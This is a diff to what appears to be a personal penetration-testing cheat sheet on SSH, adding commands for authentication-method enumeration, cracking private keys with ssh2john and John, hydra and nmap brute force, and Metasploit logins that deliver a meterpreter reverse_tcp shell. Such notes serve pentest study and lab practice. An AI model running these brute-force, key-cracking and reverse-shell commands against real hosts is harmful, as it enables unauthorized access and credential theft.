@@ -177,24 +177,35 @@ https://docs.github.com/en/authentication/connecting-to-github-with-ssh/about-ss
 
 ## SSH enumeration
 
-```
+
 #Login
-ssh uname@IP #enter the password in the prompt
+
+    ssh uname@IP #enter the password in the prompt
 
 #id_rsa or id_ecdsa file
 chmod 600 id_rsa/id_ecdsa
 ssh uname@IP -i id_rsa/id_ecdsa #if it still asks for the password, crack it using John
 
+**Enumerating SSH authentication method
+The SSH authentication method can be enumerated by using the ssh-auth-methods script in nmap, the username can be given using the –script-args flag. The following command can be used to enumerate the authentication method used:
+
+    nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 22 <ip>
 #cracking id_rsa or id_ecdsa
-ssh2john id_ecdsa(or)id_rsa > hash
-john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash
 
-#bruteforce
-hydra -l uname -P passwords.txt <IP> ssh #'-L' for usernames list, '-l' for username and vice versa
-hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<ip>
+     ssh2john id_ecdsa(or)id_rsa > hash
+     john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash
 
+bruteforce
+Since the authentication is password based hence the service can be brute forced against a username and password dictionary using hydra to find the correct username and password. After creating a username dictionary as users.txt and password dictionary as pass.txt, the following command can be used:
+
+    hydra -l uname -P passwords.txt <IP> ssh #'-L' for usernames list, '-l' for username and vice versa
+    hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<ip>
+
+**Nmap SSH brute-force script
+
+    nmap --script ssh-brute -p 22 <ip>
 # Check for vulnerabilities associated with the identified version.
-```
+
 Use full commands:
 - `t rsa`: Specifies the RSA algorithm.
 - `b 4096`: Specifies the key length (4096 bits is recommended).
@@ -203,6 +214,37 @@ Use full commands:
 - Enter the path to save the key (default is `~/.ssh/id_rsa`).
 - Enter a passphrase for the private key (optional but recommended for security).
 - You'll have a public key (`~/.ssh/id_rsa.pub`) and a private key (`~/.ssh/id_rsa`).
+
+### Authentication using Metasploit
+
+An alternate way to perform the above procedure could be done by using the Metasploit module. The exploit multi/ssh/sshexec can be used to authenticate into the SSH service. Here we are assuming that the attacker has compromised the username and password already. Following will be the commands inside the Metasploit:
+
+    use exploit/multi/ssh/sshexec
+    set rhosts 192.168.31.205
+    set payload linux/x86/meterpreter/reverse_tcp
+    set username pentest
+    set password 123
+    show targets
+    set target 1
+    exploit
+
+###Key based authentication (Metasploit)
+
+The above procedure can also be performed using the Metasploit framework. The auxiliary/scanner/ssh/ssh_login_pubkey can be used to authenticate via key.
+
+Following options can be given as configurations to run the auxiliary/scanner:
+
+    use auxiliary/scanner/ssh/ssh_login_pubkey
+    set rhosts 192.168.31.205
+    set key_path /root/Downloads/ssh/id_rsa
+    set key_pass 123
+    set username pentest
+    exploit
+**while performing the brute force using hydra, the updated port needs to be given. Hence, the new command will be:
+
+    hydra -L users.txt -P pass.txt <ip> ssh -s 2222
+<img width="749" height="232" alt="image" src="https://github.com/user-attachments/assets/1aeefe88-7835-4718-857f-1107a5bb211a" />
+
 
 **2. Copy the Public Key to the Server:**
 
